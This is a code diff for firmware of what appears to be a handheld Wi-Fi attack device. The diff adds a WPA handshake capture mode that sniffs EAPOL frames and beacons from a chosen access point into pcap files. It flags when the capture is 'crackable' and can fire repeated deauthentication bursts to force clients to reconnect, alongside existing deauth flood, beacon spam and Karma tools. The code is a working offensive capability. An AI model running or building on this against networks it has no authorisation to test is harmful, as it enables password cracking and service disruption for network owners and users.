@@ -18,7 +18,7 @@ const char *const MENU_ITEMS[] = {"WiFi", "BLE", "RF 433MHz", "NRF24 2.4GHz", "I
 constexpr int MENU_COUNT = sizeof(MENU_ITEMS) / sizeof(MENU_ITEMS[0]);
 constexpr int WIFI_ITEM = 0;
 
-const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma"};
+const char *const WIFI_TOOLS[] = {"Scan networks", "Channel analyzer", "Packet sniffer", "Beacon spam", "Deauth flood", "Karma", "Handshake capture"};
 constexpr int WIFI_TOOL_COUNT = sizeof(WIFI_TOOLS) / sizeof(WIFI_TOOLS[0]);
 constexpr int WIFI_TOOL_SCAN = 0;
 constexpr int WIFI_TOOL_CHANNELS = 1;
@@ -26,6 +26,7 @@ constexpr int WIFI_TOOL_SNIFF = 2;
 constexpr int WIFI_TOOL_BEACON = 3;
 constexpr int WIFI_TOOL_DEAUTH = 4;
 constexpr int WIFI_TOOL_KARMA = 5;
+constexpr int WIFI_TOOL_HANDSHAKE = 6;
 
 constexpr int WIFI_VISIBLE_ROWS = 8;
 constexpr int CH_FIRST = 1;
@@ -34,7 +35,7 @@ constexpr uint32_t CH_DWELL_MS = 300;
 constexpr int BAR_BASE_Y = 108;
 constexpr int BAR_MAX_H = 72;
 
-enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun };
+enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun, WifiHsRun };
 
 Screen screen = Screen::Menu;
 int selected = 0;
@@ -375,13 +376,13 @@ bool ensureSd() {
     return sdReady;
 }
 
-void startPcap() {
+void startPcap(const char *prefix) {
     if (!ensureSd()) {
         snprintf(pcapMsg, sizeof(pcapMsg), "no SD card found");
         return;
     }
     if (!SD.exists("/pcap")) SD.mkdir("/pcap");
-    snprintf(pcapName, sizeof(pcapName), "kaiju_%lu.pcap", (unsigned long)(millis() / 1000));
+    snprintf(pcapName, sizeof(pcapName), "%s_%lu.pcap", prefix, (unsigned long)(millis() / 1000));
     char path[64];
     snprintf(path, sizeof(path), "/pcap/%s", pcapName);
     pcapFile = SD.open(path, FILE_WRITE);
@@ -414,7 +415,7 @@ void toggleRecording() {
     if (pcapActive.load(std::memory_order_acquire)) {
         stopPcap();
     } else {
-        startPcap();
+        startPcap("kaiju");
     }
 }
 
@@ -962,6 +963,14 @@ const char *verdictTag(PmfVerdict v) {
     }
 }
 
+enum ListPurpose : uint8_t { PURPOSE_DEAUTH, PURPOSE_HANDSHAKE };
+ListPurpose listPurpose = PURPOSE_DEAUTH;
+
+const char *rowTag(int idx) {
+    if (dlVerdict[idx] == V_NOT_SEEN) return dlRssi[idx] < -85 ? "weak" : "--";
+    return verdictTag(dlVerdict[idx]);
+}
+
 void drawDeauthSelect() {
     auto &d = M5Cardputer.Display;
     d.fillScreen(COLOR_BG);
@@ -971,7 +980,8 @@ void drawDeauthSelect() {
     if (pmfPassActive) {
         snprintf(header, sizeof(header), "Checking ch%-2d  sweep %d/%d", pmfPassCh, pmfPassSweep + 1, PMF_SWEEPS);
     } else {
-        snprintf(header, sizeof(header), "Deauth: %d networks", dlCount);
+        snprintf(header, sizeof(header), "%s: %d networks (dBm)",
+                 listPurpose == PURPOSE_HANDSHAKE ? "Handshake" : "Deauth", dlCount);
     }
     d.drawString(header, 4, 4);
     for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
@@ -986,13 +996,19 @@ void drawDeauthSelect() {
         }
         const char *nm = dlSsid[idx][0] != '\0' ? dlSsid[idx] : "<hidden>";
         char line[48];
-        snprintf(line, sizeof(line), "%-12.12s %-6s %-4s ch%-2d %3d", nm, authLabel(dlAuth[idx]),
-                 verdictTag(dlVerdict[idx]), dlChan[idx], dlRssi[idx]);
+        snprintf(line, sizeof(line), "%-12.12s %-6s %-4s ch%-2d %3d", nm, authLabel(dlAuth[idx]), rowTag(idx),
+                 dlChan[idx], dlRssi[idx]);
         d.drawString(line, 4, y);
     }
     d.setTextColor(COLOR_SECONDARY, COLOR_BG);
-    d.drawString("VULN no PMF  PART optional  PMF req", 4, 114);
-    d.drawString(pmfPassActive ? "Bksp cancel check" : "Enter check  R recheck  Bksp back", 4, 124);
+    d.drawString("VULN noPMF PART opt PMF req weak=far", 4, 114);
+    if (pmfPassActive) {
+        d.drawString("Bksp cancel check", 4, 124);
+    } else if (listPurpose == PURPOSE_HANDSHAKE) {
+        d.drawString("Enter capture  R sweep  Bksp back", 4, 124);
+    } else {
+        d.drawString("Enter check  R recheck  Bksp back", 4, 124);
+    }
 }
 
 void loadDeauthScan() {
@@ -1374,6 +1390,137 @@ void tickKarma() {
     }
 }
 
+constexpr uint8_t EAPOL_LLC[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
+std::atomic<uint32_t> hsMsgCount[5] = {};
+std::atomic<uint32_t> hsEapolTotal{0};
+std::atomic<bool> hsBeaconSaved{false};
+bool hsRunning = false;
+bool hsDeauth = false;
+uint32_t hsLastBurst = 0;
+uint32_t hsLastDraw = 0;
+
+int eapolMessageNumber(uint16_t ki) {
+    bool install = ki & (1 << 6);
+    bool ack = ki & (1 << 7);
+    bool mic = ki & (1 << 8);
+    bool secure = ki & (1 << 9);
+    if (ack && !mic && !install) return 1;
+    if (!ack && mic && !install && !secure) return 2;
+    if (ack && mic && install) return 3;
+    if (!ack && mic && !install && secure) return 4;
+    return 0;
+}
+
+void onHandshake(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!pcapActive.load(std::memory_order_acquire)) return;
+    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
+    const uint8_t *p = pkt->payload;
+    uint32_t len = pkt->rx_ctrl.sig_len;
+    if (len < 24) return;
+    if (type == WIFI_PKT_MGMT) {
+        if (((p[0] >> 4) & 0xF) != 0x8) return;
+        if (memcmp(&p[16], deauthBssid, 6) != 0) return;
+        if (hsBeaconSaved.exchange(true, std::memory_order_relaxed)) return;
+        pcapEnqueue(pkt);
+        return;
+    }
+    if (type != WIFI_PKT_DATA) return;
+    bool toDs = p[1] & 0x01;
+    bool fromDs = p[1] & 0x02;
+    bool qos = p[0] & 0x80;
+    uint32_t hdr = 24 + ((toDs && fromDs) ? 6 : 0) + (qos ? 2 : 0);
+    if (len < hdr + 17) return;
+    if (memcmp(&p[hdr], EAPOL_LLC, 8) != 0) return;
+    if (memcmp(&p[4], deauthBssid, 6) != 0 && memcmp(&p[10], deauthBssid, 6) != 0 &&
+        memcmp(&p[16], deauthBssid, 6) != 0) {
+        return;
+    }
+    hsEapolTotal.fetch_add(1, std::memory_order_relaxed);
+    int msg = eapolMessageNumber(static_cast<uint16_t>((p[hdr + 13] << 8) | p[hdr + 14]));
+    if (msg > 0) hsMsgCount[msg].fetch_add(1, std::memory_order_relaxed);
+    pcapEnqueue(pkt);
+}
+
+void drawHandshake() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char line[48];
+    snprintf(line, sizeof(line), "Handshake  ch%-2d  %s", deauthCh, hsRunning ? "RUNNING" : "stopped");
+    d.drawString(line, 4, 4);
+    snprintf(line, sizeof(line), "AP: %s", deauthSsid);
+    d.drawString(line, 4, 16);
+    uint32_t m1 = hsMsgCount[1].load(std::memory_order_relaxed);
+    uint32_t m2 = hsMsgCount[2].load(std::memory_order_relaxed);
+    uint32_t m3 = hsMsgCount[3].load(std::memory_order_relaxed);
+    uint32_t m4 = hsMsgCount[4].load(std::memory_order_relaxed);
+    snprintf(line, sizeof(line), "M1 %lu  M2 %lu  M3 %lu  M4 %lu", (unsigned long)m1, (unsigned long)m2,
+             (unsigned long)m3, (unsigned long)m4);
+    d.drawString(line, 4, 30);
+    snprintf(line, sizeof(line), "EAPOL %lu  beacon %s  deauth %s",
+             (unsigned long)hsEapolTotal.load(std::memory_order_relaxed),
+             hsBeaconSaved.load(std::memory_order_relaxed) ? "yes" : "no", hsDeauth ? "on" : "off");
+    d.drawString(line, 4, 42);
+    bool crackable = m2 > 0 && (m1 > 0 || m3 > 0);
+    d.drawString(crackable ? "Crackable: YES (M2 + M1 or M3)" : "Crackable: not yet", 4, 58);
+    if (pcapActive.load(std::memory_order_acquire)) {
+        snprintf(line, sizeof(line), "%s  %lu KB", pcapName, (unsigned long)(pcapBytes / 1024));
+    } else {
+        snprintf(line, sizeof(line), "%s", pcapMsg);
+    }
+    d.drawString(line, 4, 72);
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    d.drawString("Enter run  D deauth  Bksp back", 4, 124);
+}
+
+void enterHandshakeSelect() {
+    attackRadio();
+    drawWifiMessage("Scanning...");
+    WiFi.scanDelete();
+    loadDeauthScan();
+    drawDeauthSelect();
+}
+
+void startHandshake() {
+    attackRadio();
+    startPcap("hs");
+    if (!pcapActive.load(std::memory_order_acquire)) return;
+    setAnalyzerChannel(deauthCh);
+    for (auto &c : hsMsgCount) c.store(0, std::memory_order_relaxed);
+    hsEapolTotal.store(0, std::memory_order_relaxed);
+    hsBeaconSaved.store(false, std::memory_order_relaxed);
+    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(&onHandshake);
+    esp_wifi_set_promiscuous(true);
+    hsRunning = true;
+    hsLastBurst = 0;
+    hsLastDraw = 0;
+    drawHandshake();
+}
+
+void stopHandshake() {
+    if (!hsRunning) return;
+    hsRunning = false;
+    esp_wifi_set_promiscuous(false);
+    delay(20);
+    stopPcap();
+}
+
+void tickHandshake() {
+    if (!hsRunning) return;
+    uint32_t now = millis();
+    if (hsDeauth && now - hsLastBurst >= 300) {
+        hsLastBurst = now;
+        deauthBurst();
+    }
+    if (now - hsLastDraw >= 1000) {
+        hsLastDraw = now;
+        drawHandshake();
+    }
+}
+
 bool wordHas(const std::vector<char> &word, char c) {
     for (char w : word) {
         if (tolower(w) == c) return true;
@@ -1404,6 +1551,10 @@ void loop() {
     if (screen == Screen::WifiDeauthSelect) tickPmfPass();
     if (screen == Screen::WifiDeauthRun) tickDeauth();
     if (screen == Screen::WifiKarmaRun) tickKarma();
+    if (screen == Screen::WifiHsRun) {
+        pcapFlush(8192);
+        tickHandshake();
+    }
     if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;
 
     auto &ks = M5Cardputer.Keyboard.keysState();
@@ -1464,7 +1615,12 @@ void loop() {
                 drawSpamSelect();
             } else if (wifiToolSel == WIFI_TOOL_DEAUTH) {
                 screen = Screen::WifiDeauthSelect;
+                listPurpose = PURPOSE_DEAUTH;
                 enterDeauthSelect();
+            } else if (wifiToolSel == WIFI_TOOL_HANDSHAKE) {
+                screen = Screen::WifiDeauthSelect;
+                listPurpose = PURPOSE_HANDSHAKE;
+                enterHandshakeSelect();
             } else if (wifiToolSel == WIFI_TOOL_KARMA) {
                 screen = Screen::WifiKarmaRun;
                 startKarma();
@@ -1620,8 +1776,13 @@ void loop() {
         } else if (ks.enter) {
             if (dlCount > 0) {
                 chooseDeauthTarget();
-                screen = Screen::WifiDeauthCheck;
-                startDeauthCheck();
+                if (listPurpose == PURPOSE_HANDSHAKE) {
+                    screen = Screen::WifiHsRun;
+                    drawHandshake();
+                } else {
+                    screen = Screen::WifiDeauthCheck;
+                    startDeauthCheck();
+                }
             }
         }
         break;
@@ -1677,6 +1838,25 @@ void loop() {
                 if (karmaRunning) setAnalyzerChannel(karmaCh);
             }
             drawKarmaRun();
+        }
+        break;
+
+    case Screen::WifiHsRun:
+        if (back) {
+            stopHandshake();
+            hsDeauth = false;
+            screen = Screen::WifiDeauthSelect;
+            drawDeauthSelect();
+        } else if (ks.enter) {
+            if (hsRunning) {
+                stopHandshake();
+            } else {
+                startHandshake();
+            }
+            drawHandshake();
+        } else if (wordHas(ks.word, 'd')) {
+            hsDeauth = !hsDeauth;
+            drawHandshake();
         }
         break;
     }
